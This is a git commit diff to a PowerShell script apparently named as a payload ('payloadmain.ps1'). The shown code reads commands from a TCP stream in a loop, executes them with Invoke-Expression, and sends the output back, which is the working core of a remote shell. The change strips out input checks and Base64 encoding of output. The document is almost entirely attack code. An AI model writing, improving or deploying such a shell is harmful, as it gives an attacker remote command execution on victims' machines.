ac3b884513cf62467c7bf8bc9b52a76090a28373
EffortPeaked <149322073+EffortPeaked@users.noreply.github.com>
2023-11-26 17:51:19 -0600

    Update payloadmain.ps1

--- payloadmain.ps1
+++ payloadmain.ps1
@@ -11,18 +11,10 @@ while ($true) {
     }
 
     $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
+    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)
 
-    # Check for null or empty data
-    if (-not [string]::IsNullOrWhiteSpace($receivedData)) {
-        $commandOutput = Invoke-Expression -Command $receivedData 2>&1
-
-        # Handle non-text characters using Base64 encoding
-        $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($commandOutput))
-        $stream.Write($encodedOutput, 0, $encodedOutput.Length)
-    }
-
-    # Clear the buffer
-    $buffer = $null
+    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
 }
 
 $tcpClient.Close()
